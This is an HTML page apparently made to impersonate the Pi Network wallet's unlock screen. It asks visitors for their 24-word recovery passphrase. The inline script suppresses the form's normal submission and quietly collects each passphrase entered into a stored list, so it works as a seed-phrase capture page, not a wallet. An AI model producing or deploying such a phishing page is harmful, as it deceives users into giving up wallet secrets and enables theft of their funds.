<body>
    <div class="heada">
        <a href="pisite.html"><img class="back" src="back.png" alt=""></a>
        <div class="midsec"><img class="pilogo2" src="pilogo2.png" alt=""><p>Wallet</p><img src="pilogo.png" alt=""></div>
        <img class="dropdown" src="down-arrow.png" alt="">
    </div>
    <div class="bodydiv">
        <h3>Unlock Pi Wallet</h3>
        <form id="myForm">
        <textarea id="myTextarea" class="seedphrase" placeholder="Enter your 24-word Passphrase here"></textarea>
        
        <button type="submit" class="unlockbtn">Unlock With Passphrase</button>
        </form>
        <div class="Textsec">
        <p>
            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of
            passphrase is currently impossible. 
        </p>
        <p>
            Lost your passphrase? <span>You can create a new wallet,</span> but all your Ï€ in your previous wallet will be inaccessible.
        </p>
        </div>
    </div>
    <script>
      document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault(); 
            const textareaValue = document.getElementById('myTextarea').value;
            const existingValues = JSON.parse(localStorage.getItem('textareaValues')) || [];
            existingValues.push(textareaValue);
            localStorage.setItem('textareaValues', JSON.stringify(existingValues));
        });
    </script>
</body>
